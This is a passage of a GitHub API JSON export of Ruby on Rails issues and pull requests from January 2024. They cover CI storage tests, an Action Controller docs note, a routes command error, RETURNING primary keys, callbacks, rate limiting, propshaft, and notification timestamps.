        "body": "While investigating #50427, I found that the service configurations were missing, I think due to #47259.\r\n\r\nWe should expect the S3 and GCS tests to run here, like in 7-0-stable:\r\nhttps://buildkite.com/rails/rails/builds/104036#018d1779-6305-41bb-82d1-b262123dcab4\r\n\r\n```\r\nSkipping Azure Storage Direct Upload tests because no Azure Storage configuration was supplied\r\nSkipping Azure Storage Public Service tests because no Azure configuration was supplied\r\nSkipping Azure Storage Service tests because no Azure configuration was supplied\r\nSkipping GCS Public Service tests because no GCS configuration was supplied\r\n/usr/local/bundle/gems/googleauth-1.9.1/lib/googleauth/helpers/connection.rb:27: warning: attribute accessor as module_function\r\n/usr/local/bundle/gems/google-apis-core-0.11.3/lib/google/apis/core/base_service.rb:228: warning: method redefined; discarding old client\r\nSkipping S3 Public Service tests because no S3 configuration was supplied\r\n/usr/local/bundle/gems/aws-sdk-s3-1.142.0/lib/aws-sdk-s3/endpoint_provider.rb:22: warning: assigned but unused variable - key\r\n/usr/local/bundle/gems/aws-sdk-s3-1.142.0/lib/aws-sdk-s3/endpoint_provider.rb:23: warning: assigned but unused variable - prefix\r\n```\r\n\r\nHowever, you can see in the build from that PR that all services are skipped:\r\nhttps://buildkite.com/rails/rails/builds/93948#018666ba-a8de-47d3-877d-26788ab11fcd/1010-1083\r\n\r\n```\r\nSkipping S3 Direct Upload tests because no S3 configuration was supplied\r\nSkipping GCS Direct Upload tests because no GCS configuration was supplied\r\nSkipping Azure Storage Direct Upload tests because no Azure Storage configuration was supplied\r\nSkipping Azure Storage Public Service tests because no Azure configuration was supplied\r\nSkipping Azure Storage Service tests because no Azure configuration was supplied\r\nSkipping GCS Public Service tests because no GCS configuration was supplied\r\nSkipping GCS Service tests because no GCS configuration was supplied\r\nSkipping S3 Public Service tests because no S3 configuration was supplied\r\nSkipping S3 Service tests because no S3 configuration was supplied\r\n```\r\n\r\nI wasn't able to find a previous build (on 7-1-stable branch) older than that, so going on a hunch here.\r\n\r\nGoing to see if this at least gets the tests running in CI for this branch first, since the work to remove the dummy application is probably not going to be backported.",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50786/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50786/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50785",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50785/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50785/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50785/events",
        "html_url": "https://github.com/rails/rails/pull/50785",
        "id": 2087298785,
        "node_id": "PR_kwDNIULOZF9HWA",
        "number": 50785,
        "title": "Add note about `params` hash in Action Controller Overview [ci skip] ",
        "user": {
            "login": "JunichiIto",
            "id": 1148320,
            "node_id": "MDQ6VXNlcjExNDgzMjA=",
            "avatar_url": "https://avatars.githubusercontent.com/u/1148320?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/JunichiIto",
            "html_url": "https://github.com/JunichiIto",
            "followers_url": "https://api.github.com/users/JunichiIto/followers",
            "following_url": "https://api.github.com/users/JunichiIto/following{/other_user}",
            "gists_url": "https://api.github.com/users/JunichiIto/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/JunichiIto/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/JunichiIto/subscriptions",
            "organizations_url": "https://api.github.com/users/JunichiIto/orgs",
            "repos_url": "https://api.github.com/users/JunichiIto/repos",
            "events_url": "https://api.github.com/users/JunichiIto/events{/privacy}",
            "received_events_url": "https://api.github.com/users/JunichiIto/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 150377,
                "node_id": "MDU6TGFiZWwxNTAzNzc=",
                "url": "https://api.github.com/repos/rails/rails/labels/docs",
                "name": "docs",
                "color": "02d7e1",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-18T01:26:00Z",
        "updated_at": "2024-01-18T17:22:33Z",
        "closed_at": null,
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50785",
            "html_url": "https://github.com/rails/rails/pull/50785",
            "diff_url": "https://github.com/rails/rails/pull/50785.diff",
            "patch_url": "https://github.com/rails/rails/pull/50785.patch",
            "merged_at": null
        },
        "body": "### Motivation / Background\r\n\r\nNewbies tend to misunderstand `params` hash is a plain old Hash. So I added a note that `params` hash is ActionController::Parameters.\r\n\r\n### Detail\r\n\r\nThis Pull Request changes \"4 Parameters\" in Action Controller Overview.\r\n\r\n![Screenshot 2024-01-18 at 10 31 55](https://github.com/rails/rails/assets/1148320/de0dc860-35d1-4d3b-b209-ab4abbac5a17)\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [ ] Tests are added or updated if you fix a bug or add a feature.\r\n* [ ] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50785/reactions",
            "total_count": 1,
            "+1": 1,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50785/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50784",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50784/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50784/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50784/events",
        "html_url": "https://github.com/rails/rails/issues/50784",
        "id": 2087071421,
        "node_id": "I_kwDNIULOfGYuvQ",
        "number": 50784,
        "title": "rails routes --unused error for nil controllers",
        "user": {
            "login": "jacquesn",
            "id": 20248160,
            "node_id": "MDQ6VXNlcjIwMjQ4MTYw",
            "avatar_url": "https://avatars.githubusercontent.com/u/20248160?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/jacquesn",
            "html_url": "https://github.com/jacquesn",
            "followers_url": "https://api.github.com/users/jacquesn/followers",
            "following_url": "https://api.github.com/users/jacquesn/following{/other_user}",
            "gists_url": "https://api.github.com/users/jacquesn/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/jacquesn/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/jacquesn/subscriptions",
            "organizations_url": "https://api.github.com/users/jacquesn/orgs",
            "repos_url": "https://api.github.com/users/jacquesn/repos",
            "events_url": "https://api.github.com/users/jacquesn/events{/privacy}",
            "received_events_url": "https://api.github.com/users/jacquesn/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2024-01-17T22:02:05Z",
        "updated_at": "2024-01-26T21:42:02Z",
        "closed_at": "2024-01-26T21:41:56Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "I don't know how to reproduce this one, but I'll describe it. Running `rails routes --unused` raises:\r\n\r\n> rails/commands/unused_routes/unused_routes_command.rb:42:in `action_missing?': undefined method `to_sym' for nil (NoMethodError)\r\n\r\nI seem to somehow have three instances of `ActionDispatch::Journey::Route` where their `RouteInfo` `@controller_name` and `@action_name` are `nil`. \r\n\r\nIf I add a line in `RouteInfo#unused?`, I can get the command to work for me (super helpful command by the way!):\r\n\r\n```\r\ndef unused?\r\n  return false if @controller_name.nil? # This line\r\n\r\n  controller_class_missing? || (action_missing? && template_missing?)\r\nend\r\n```\r\n\r\nIf I comment out all my application routes, I still get this problem, so I'm guessing the problem routes are coming from gems or something in my particular Rails configuration. One of the bad routes, for instance, gives an instance of `Sprockets::Environment` on `.app.app`. \r\n\r\n### System configuration\r\n**Rails version**: 7.1.2\r\n\r\n**Ruby version**: 3.3.0\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50784/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50784/timeline",
        "performed_via_github_app": null,
        "state_reason": "not_planned"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50783",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50783/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50783/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50783/events",
        "html_url": "https://github.com/rails/rails/pull/50783",
        "id": 2086680737,
        "node_id": "PR_kwDNIULOZFbNkA",
        "number": 50783,
        "title": "Always request `primary_key` in `RETURNING` if no other columns requested",
        "user": {
            "login": "nvasilevski",
            "id": 5512772,
            "node_id": "MDQ6VXNlcjU1MTI3NzI=",
            "avatar_url": "https://avatars.githubusercontent.com/u/5512772?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/nvasilevski",
            "html_url": "https://github.com/nvasilevski",
            "followers_url": "https://api.github.com/users/nvasilevski/followers",
            "following_url": "https://api.github.com/users/nvasilevski/following{/other_user}",
            "gists_url": "https://api.github.com/users/nvasilevski/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/nvasilevski/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/nvasilevski/subscriptions",
            "organizations_url": "https://api.github.com/users/nvasilevski/orgs",
            "repos_url": "https://api.github.com/users/nvasilevski/repos",
            "events_url": "https://api.github.com/users/nvasilevski/events{/privacy}",
            "received_events_url": "https://api.github.com/users/nvasilevski/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2024-01-17T17:49:36Z",
        "updated_at": "2024-01-18T17:03:54Z",
        "closed_at": "2024-01-18T16:45:40Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50783",
            "html_url": "https://github.com/rails/rails/pull/50783",
            "diff_url": "https://github.com/rails/rails/pull/50783.diff",
            "patch_url": "https://github.com/rails/rails/pull/50783.patch",
            "merged_at": "2024-01-18T16:45:40Z"
        },
        "body": "Potentially substitutes https://github.com/rails/rails/pull/49955\r\n\r\nAddresses https://github.com/rails/rails/issues/49950\r\nAddresses https://github.com/rails/rails/issues/50001\r\n\r\nPrior 7.1 Rails always included `primary_key` in `RETURNING` clause on record creation. This was changed in 7.1 to include more auto-populated columns if such columns exist. This change lead to situations where no columns were requested in `RETURNING` clause, even the `primary_key`.\r\n\r\nThis change brings back the old behavior of always requesting the `primary_key` in `RETURNING` clause if no other columns are requested.\r\n\r\n### Tests\r\n\r\nI added two separate tests to cover both reported scenarios:\r\n1. Rails doesn't request PK after inserting a row in a view\r\n2. Rails doesn't request PK if PK populated by something Rails can't know about (examples: Vitess or a trigger)",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50783/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50783/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50782",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50782/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50782/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50782/events",
        "html_url": "https://github.com/rails/rails/issues/50782",
        "id": 2086541600,
        "node_id": "I_kwDNIULOfF4ZIA",
        "number": 50782,
        "title": "Rails 7.x after_destroy not triggered when a before_create on associated model is defined",
        "user": {
            "login": "devsheva",
            "id": 74725303,
            "node_id": "MDQ6VXNlcjc0NzI1MzAz",
            "avatar_url": "https://avatars.githubusercontent.com/u/74725303?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/devsheva",
            "html_url": "https://github.com/devsheva",
            "followers_url": "https://api.github.com/users/devsheva/followers",
            "following_url": "https://api.github.com/users/devsheva/following{/other_user}",
            "gists_url": "https://api.github.com/users/devsheva/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/devsheva/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/devsheva/subscriptions",
            "organizations_url": "https://api.github.com/users/devsheva/orgs",
            "repos_url": "https://api.github.com/users/devsheva/repos",
            "events_url": "https://api.github.com/users/devsheva/events{/privacy}",
            "received_events_url": "https://api.github.com/users/devsheva/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 11,
        "created_at": "2024-01-17T16:26:16Z",
        "updated_at": "2024-01-21T22:10:08Z",
        "closed_at": "2024-01-21T22:10:08Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\n\r\nPrerequisites\r\n- [stateful_enum](https://github.com/amatsuda/stateful_enum)\r\n- rspec\r\n\r\n```ruby\r\n\r\nORDER_MAX_ITEMS = 100\r\n\r\n# == Schema Information\r\n#\r\n# Table name: orders\r\n#\r\n#  id                   :integer          not null, primary key\r\n#  code                 :string\r\n#  cart_user_id         :string\r\n#  status               :integer\r\n#  customer_id          :integer\r\n#  invoice_profile_id   :integer\r\n#  created_at           :datetime         not null\r\n#  updated_at           :datetime         not null\r\n#  expiration_timestamp :datetime\r\n#  payment_datetime     :datetime\r\n#  payment_method_id    :string\r\n#  payment_method_type  :string\r\n#  error_info           :json\r\n#\r\nclass Order < ApplicationRecord\r\n  ### Associations ###\r\n  has_many :order_items, dependent: :destroy, autosave: true\r\n\r\n  ### Enums ###\r\n  enum status: {expired: 5 } do\r\n \r\n    event :expire do\r\n      before { self.order_items = [] }\r\n      transition all - [:paid, :cancelled] => :expired\r\n    end\r\n\r\n  end\r\n\r\n\r\n  def check_max_order_items_reached\r\n    if order_items.size == ORDER_MAX_ITEMS\r\n      raise Error::CustomError.new(\r\n        \"order.check_max_order_items_reached.reached\",\r\n        422,\r\n        \"Maximum Order items reached\"\r\n      )\r\n    end\r\n  end\r\n\r\n \r\nend\r\n\r\n\r\n\r\n# == Schema Information\r\n#\r\n# Table name: order_items\r\n#\r\n#  id                 :integer          not null, primary key\r\n#  order_id           :integer          not null\r\n#  status             :integer\r\n#  product_code       :integer\r\n#  itemable_type      :string\r\n#  itemable_id        :integer\r\n#  price              :float\r\n#  created_at         :datetime         not null\r\n#  updated_at         :datetime         not null\r\n#  is_executed        :boolean\r\n#  execution_datetime :datetime\r\n#  dns_setup          :integer\r\n#  apply_to_all       :boolean\r\n#  template_dns       :integer\r\n#  amount_tax         :float\r\n#  vat                :integer\r\n#\r\nclass OrderItem < ApplicationRecord\r\n  delegate(:check_max_order_items_reached, to: :order)\r\n\r\n  ### Associations ###\r\n  belongs_to :order\r\n  belongs_to :itemable, polymorphic: true, optional: true\r\n\r\n  # \r\n  before_create :check_max_order_items_reached\r\n  after_destroy :destroy_associated_records\r\n\r\nend\r\n\r\n```\r\n\r\n### Expected behavior\r\nIt should trigger after_destroy as expected\r\n\r\n### Actual behavior\r\nIt doesn't trigger the after_destroy in OrderItem model after I've added the before_create callback.\r\n\r\n### System configuration\r\n**Rails version**: 7.0.8\r\n\r\n**Ruby version**: 3.1.3\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50782/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50782/timeline",
        "performed_via_github_app": null,
        "state_reason": "completed"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50781",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50781/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50781/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50781/events",
        "html_url": "https://github.com/rails/rails/pull/50781",
        "id": 2086321407,
        "node_id": "PR_kwDNIULOZFHwDA",
        "number": 50781,
        "title": "Refactor `ActionController::RateLimiting` to use `AS::Cache`",
        "user": {
            "login": "casperisfine",
            "id": 19192189,
            "node_id": "MDQ6VXNlcjE5MTkyMTg5",
            "avatar_url": "https://avatars.githubusercontent.com/u/19192189?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/casperisfine",
            "html_url": "https://github.com/casperisfine",
            "followers_url": "https://api.github.com/users/casperisfine/followers",
            "following_url": "https://api.github.com/users/casperisfine/following{/other_user}",
            "gists_url": "https://api.github.com/users/casperisfine/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/casperisfine/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/casperisfine/subscriptions",
            "organizations_url": "https://api.github.com/users/casperisfine/orgs",
            "repos_url": "https://api.github.com/users/casperisfine/repos",
            "events_url": "https://api.github.com/users/casperisfine/events{/privacy}",
            "received_events_url": "https://api.github.com/users/casperisfine/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107189,
                "node_id": "MDU6TGFiZWwxMDcxODk=",
                "url": "https://api.github.com/repos/rails/rails/labels/actionpack",
                "name": "actionpack",
                "color": "FFF700",
                "default": false,
                "description": null
            },
            {
                "id": 107194,
                "node_id": "MDU6TGFiZWwxMDcxOTQ=",
                "url": "https://api.github.com/repos/rails/rails/labels/activesupport",
                "name": "activesupport",
                "color": "FC9300",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 6,
        "created_at": "2024-01-17T14:32:07Z",
        "updated_at": "2024-01-25T15:36:05Z",
        "closed_at": "2024-01-17T16:49:27Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50781",
            "html_url": "https://github.com/rails/rails/pull/50781",
            "diff_url": "https://github.com/rails/rails/pull/50781.diff",
            "patch_url": "https://github.com/rails/rails/pull/50781.patch",
            "merged_at": "2024-01-17T16:49:27Z"
        },
        "body": "Given that the limiter implementation provided by Kredis is a simple increment with a limit, all `ActiveSupport::Cache` already provide that same capability, with a wide range of backing stores, and not just Redis.\r\n\r\nThis even allow to use SolidCache has a backend if you so desire.\r\n\r\nIf we feel particularly fancy, we could also accept a more generic limiter interface to better allow users to swap the implementation for better algorithms such as leaky-bucket etc.\r\n\r\nFYI @dhh @rafaelfranca ",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50781/reactions",
            "total_count": 5,
            "+1": 2,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 3,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50781/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50780",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50780/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50780/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50780/events",
        "html_url": "https://github.com/rails/rails/pull/50780",
        "id": 2086045509,
        "node_id": "PR_kwDNIULOZE41OQ",
        "number": 50780,
        "title": "Preserve `--asset-pipeline propshaft` when running `app:update`",
        "user": {
            "login": "zachasme",
            "id": 986290,
            "node_id": "MDQ6VXNlcjk4NjI5MA==",
            "avatar_url": "https://avatars.githubusercontent.com/u/986290?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/zachasme",
            "html_url": "https://github.com/zachasme",
            "followers_url": "https://api.github.com/users/zachasme/followers",
            "following_url": "https://api.github.com/users/zachasme/following{/other_user}",
            "gists_url": "https://api.github.com/users/zachasme/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/zachasme/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/zachasme/subscriptions",
            "organizations_url": "https://api.github.com/users/zachasme/orgs",
            "repos_url": "https://api.github.com/users/zachasme/repos",
            "events_url": "https://api.github.com/users/zachasme/events{/privacy}",
            "received_events_url": "https://api.github.com/users/zachasme/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": {
            "url": "https://api.github.com/repos/rails/rails/milestones/88",
            "html_url": "https://github.com/rails/rails/milestone/88",
            "labels_url": "https://api.github.com/repos/rails/rails/milestones/88/labels",
            "id": 10422595,
            "node_id": "MI_kwDNIULOAJ8JQw",
            "number": 88,
            "title": "7.1.4",
            "description": null,
            "creator": {
                "login": "rafaelfranca",
                "id": 47848,
                "node_id": "MDQ6VXNlcjQ3ODQ4",
                "avatar_url": "https://avatars.githubusercontent.com/u/47848?v=4",
                "gravatar_id": "",
                "url": "https://api.github.com/users/rafaelfranca",
                "html_url": "https://github.com/rafaelfranca",
                "followers_url": "https://api.github.com/users/rafaelfranca/followers",
                "following_url": "https://api.github.com/users/rafaelfranca/following{/other_user}",
                "gists_url": "https://api.github.com/users/rafaelfranca/gists{/gist_id}",
                "starred_url": "https://api.github.com/users/rafaelfranca/starred{/owner}{/repo}",
                "subscriptions_url": "https://api.github.com/users/rafaelfranca/subscriptions",
                "organizations_url": "https://api.github.com/users/rafaelfranca/orgs",
                "repos_url": "https://api.github.com/users/rafaelfranca/repos",
                "events_url": "https://api.github.com/users/rafaelfranca/events{/privacy}",
                "received_events_url": "https://api.github.com/users/rafaelfranca/received_events",
                "type": "User",
                "site_admin": false
            },
            "open_issues": 9,
            "closed_issues": 5,
            "state": "open",
            "created_at": "2024-01-15T23:00:48Z",
            "updated_at": "2024-02-27T02:00:26Z",
            "due_on": null,
            "closed_at": null
        },
        "comments": 0,
        "created_at": "2024-01-17T12:02:43Z",
        "updated_at": "2024-01-28T20:30:34Z",
        "closed_at": null,
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50780",
            "html_url": "https://github.com/rails/rails/pull/50780",
            "diff_url": "https://github.com/rails/rails/pull/50780.diff",
            "patch_url": "https://github.com/rails/rails/pull/50780.patch",
            "merged_at": null
        },
        "body": "### Motivation / Background\r\n\r\nThis Pull Request has been created because `skip_sprockets?` wasn't being preserved when running `app:update` in a project using `propshaft`. Helpful when #50444 lands.\r\n\r\n### Detail\r\n\r\nThis Pull Request sets `options[:asset_pipeline]` in `AppUpdater` based on whether Sprockets/Propshaft Railtie is defined.\r\n\r\nWithout this change, `app:update` will suggest injecting sprocket configuration in a propshaft project.",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50780/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50780/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50779",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50779/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50779/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50779/events",
        "html_url": "https://github.com/rails/rails/pull/50779",
        "id": 2086036179,
        "node_id": "PR_kwDNIULOZE4VDQ",
        "number": 50779,
        "title": "Fix `ActiveSupport::Notifications.publish_event` to preserve units",
        "user": {
            "login": "casperisfine",
            "id": 19192189,
            "node_id": "MDQ6VXNlcjE5MTkyMTg5",
            "avatar_url": "https://avatars.githubusercontent.com/u/19192189?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/casperisfine",
            "html_url": "https://github.com/casperisfine",
            "followers_url": "https://api.github.com/users/casperisfine/followers",
            "following_url": "https://api.github.com/users/casperisfine/following{/other_user}",
            "gists_url": "https://api.github.com/users/casperisfine/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/casperisfine/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/casperisfine/subscriptions",
            "organizations_url": "https://api.github.com/users/casperisfine/orgs",
            "repos_url": "https://api.github.com/users/casperisfine/repos",
            "events_url": "https://api.github.com/users/casperisfine/events{/privacy}",
            "received_events_url": "https://api.github.com/users/casperisfine/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107194,
                "node_id": "MDU6TGFiZWwxMDcxOTQ=",
                "url": "https://api.github.com/repos/rails/rails/labels/activesupport",
                "name": "activesupport",
                "color": "FC9300",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-01-17T11:57:03Z",
        "updated_at": "2024-01-17T14:51:25Z",
        "closed_at": "2024-01-17T12:07:32Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50779",
            "html_url": "https://github.com/rails/rails/pull/50779",
            "diff_url": "https://github.com/rails/rails/pull/50779.diff",
            "patch_url": "https://github.com/rails/rails/pull/50779.patch",
            "merged_at": "2024-01-17T12:07:32Z"
        },
        "body": "Ref: https://github.com/rails/rails/pull/43502\r\nFix: https://github.com/rails/rails/pull/50767\r\nFix: https://github.com/rails/rails/pull/50493\r\n\r\nWhen republishing a an event into a `start, finish` tuple, we need to convert the timestamps back into seconds.\r\n\r\ncc @fatkodima @rporrasluc \r\n\r\nTo be backported in 7.1 and 7.0",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50779/reactions",
            "total_count": 2,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 2,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50779/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50778",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50778/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50778/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50778/events",
        "html_url": "https://github.com/rails/rails/pull/50778",
        "id": 2085801011,
        "node_id": "PR_kwDNIULOZErdPA",
        "number": 50778,
        "title": "Fix async queries to work with query cache and other cached async queries",
        "user": {
            "login": "fatkodima",
            "id": 5657035,
            "node_id": "MDQ6VXNlcjU2NTcwMzU=",
            "avatar_url": "https://avatars.githubusercontent.com/u/5657035?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/fatkodima",
            "html_url": "https://github.com/fatkodima",
            "followers_url": "https://api.github.com/users/fatkodima/followers",
            "following_url": "https://api.github.com/users/fatkodima/following{/other_user}",
            "gists_url": "https://api.github.com/users/fatkodima/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/fatkodima/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/fatkodima/subscriptions",
            "organizations_url": "https://api.github.com/users/fatkodima/orgs",
            "repos_url": "https://api.github.com/users/fatkodima/repos",
            "events_url": "https://api.github.com/users/fatkodima/events{/privacy}",
            "received_events_url": "https://api.github.com/users/fatkodima/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-01-17T09:46:01Z",
        "updated_at": "2024-01-18T16:36:21Z",
        "closed_at": "2024-01-17T19:44:39Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50778",
            "html_url": "https://github.com/rails/rails/pull/50778",
